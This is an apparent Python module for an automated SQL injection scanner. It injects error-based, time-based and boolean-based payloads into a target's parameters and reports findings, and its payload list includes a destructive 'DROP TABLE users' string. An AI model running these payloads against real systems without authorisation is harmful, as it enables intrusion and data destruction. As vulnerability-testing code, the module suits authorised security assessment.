import requests
import time
import urllib.parse
from typing import Dict, Any, List
from core.base_module import BaseModule
from config.settings import config


class SQLiScanner(BaseModule):
    """SQL Injection vulnerability scanner."""

    SQL_PAYLOADS = [
        # Error-based
        "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1",
        "' OR 1=1--", "\" OR 1=1--", "' OR 1=1#",
        "1' ORDER BY 1--", "1' ORDER BY 100--",
        "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
        "1; DROP TABLE users--",

        # Time-based blind
        "' OR SLEEP(3)--", "'; WAITFOR DELAY '0:0:3'--",
        "' OR BENCHMARK(5000000,SHA1('test'))--",

        # Boolean-based blind
        "' AND 1=1--", "' AND 1=2--",
        "' AND SUBSTRING(@@version,1,1)='5'--",
    ]

    SQL_ERRORS = [
        "sql syntax", "mysql_fetch", "sqlite3", "postgresql",
        "oracle error", "microsoft sql", "unclosed quotation",
        "syntax error", "query failed", "sql error",
        "database error", "warning: mysql", "valid mysql result",
        "pg_query", "sqlstate", "odbc sql server",
        "microsoft ole db", "sqlite_error",
        "unterminated string", "quoted string not properly",
    ]

    def __init__(self):
        super().__init__("SQL Injection Scanner")
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': config.USER_AGENT})

    def _test_error_based(self, url: str, param: str, method: str = 'GET') -> List[Dict]:
        """Test for error-based SQL injection."""
        findings = []

        for payload in self.SQL_PAYLOADS[:10]:  # Error-based payloads
            try:
                if method == 'GET':
                    parsed = urllib.parse.urlparse(url)
                    params = dict(urllib.parse.parse_qsl(parsed.query))
                    params[param] = payload
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(params)}"
                    response = self.session.get(test_url, timeout=config.DEFAULT_TIMEOUT)
                else:
                    response = self.session.post(url, data={param: payload},
                                                timeout=config.DEFAULT_TIMEOUT)

                response_text = response.text.lower()

                for error in self.SQL_ERRORS:
                    if error in response_text:
                        finding = {
                            'type': 'Error-Based SQLi',
                            'severity': 'Critical',
                            'parameter': param,
                            'payload': payload,
                            'error_match': error,
                            'url': url,
                            'method': method
                        }
                        findings.append(finding)
                        self.logger.warning(
                            f"  🚨 SQLI FOUND! Parameter: {param}, "
                            f"Payload: {payload}, Error: {error}"
                        )
                        break

                time.sleep(config.SCAN_DELAY)

            except Exception as e:
                self.logger.debug(f"Error testing payload: {e}")

        return findings

    def _test_time_based(self, url: str, param: str, method: str = 'GET') -> List[Dict]:
        """Test for time-based blind SQL injection."""
        findings = []
        sleep_time = 3

        time_payloads = [
            f"' OR SLEEP({sleep_time})--",
            f"'; WAITFOR DELAY '0:0:{sleep_time}'--",
            f"' OR pg_sleep({sleep_time})--",
        ]

        # Get baseline response time
        try:
            start = time.time()
            self.session.get(url, timeout=config.DEFAULT_TIMEOUT)
            baseline = time.time() - start
        except:
            baseline = 1.0

        for payload in time_payloads:
            try:
                parsed = urllib.parse.urlparse(url)
                params = dict(urllib.parse.parse_qsl(parsed.query))
                params[param] = payload
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(params)}"

                start = time.time()
                self.session.get(test_url, timeout=config.DEFAULT_TIMEOUT + sleep_time + 2)
                elapsed = time.time() - start

                if elapsed >= baseline + sleep_time - 0.5:
                    finding = {
                        'type': 'Time-Based Blind SQLi',
                        'severity': 'Critical',
                        'parameter': param,
                        'payload': payload,
                        'response_time': f"{elapsed:.2f}s (baseline: {baseline:.2f}s)",
                        'url': url,
                        'method': method
                    }
                    findings.append(finding)
                    self.logger.warning(
                        f"  🚨 TIME-BASED SQLI! Parameter: {param}, "
                        f"Response: {elapsed:.2f}s"
                    )

                time.sleep(config.SCAN_DELAY)

            except requests.exceptions.Timeout:
                # Timeout could indicate successful injection
                finding = {
                    'type': 'Possible Time-Based Blind SQLi',
                    'severity': 'High',
                    'parameter': param,
                    'payload': payload,
                    'note': 'Request timed out - manual verification needed',
                    'url': url
                }
                findings.append(finding)

        return findings

    def _test_boolean_based(self, url: str, param: str) -> List[Dict]:
        """Test for boolean-based blind SQL injection."""
        findings = []

        try:
            # True condition
            parsed = urllib.parse.urlparse(url)
            params = dict(urllib.parse.parse_qsl(parsed.query))

            params[param] = "' AND 1=1--"
            true_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(params)}"
            true_response = self.session.get(true_url, timeout=config.DEFAULT_TIMEOUT)

            params[param] = "' AND 1=2--"
            false_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(params)}"
            false_response = self.session.get(false_url, timeout=config.DEFAULT_TIMEOUT)

            if (len(true_response.text) != len(false_response.text) and
                abs(len(true_response.text) - len(false_response.text)) > 50):
                finding = {
                    'type': 'Boolean-Based Blind SQLi',
                    'severity': 'Critical',
                    'parameter': param,
                    'true_length': len(true_response.text),
                    'false_length': len(false_response.text),
                    'url': url
                }
                findings.append(finding)
                self.logger.warning(f"  🚨 BOOLEAN SQLI! Parameter: {param}")

        except Exception as e:
            self.logger.debug(f"Boolean test error: {e}")

        return findings

    def run(self, target: str, **kwargs) -> Dict[str, Any]:
        """Run SQL injection scan."""
        params = kwargs.get('params', [])
        method = kwargs.get('method', 'GET')

        # Auto-detect parameters from URL
        if not params:
            parsed = urllib.parse.urlparse(target)
            params = [p[0] for p in urllib.parse.parse_qsl(parsed.query)]

        if not params:
            return {"warning": "No parameters found to test. Provide params or URL with query string."}

        all_findings = []
        for param in params:
            self.logger.info(f"🔍 Testing parameter: {param}")

            # Error-based
            all_findings.extend(self._test_error_based(target, param, method))

            # Time-based
            all_findings.extend(self._test_time_based(target, param, method))

            # Boolean-based
            all_findings.extend(self._test_boolean_based(target, param))

        return {
            'target': target,
            'parameters_tested': params,
            'findings': all_findings,
            'total_vulnerabilities': len(all_findings)
        }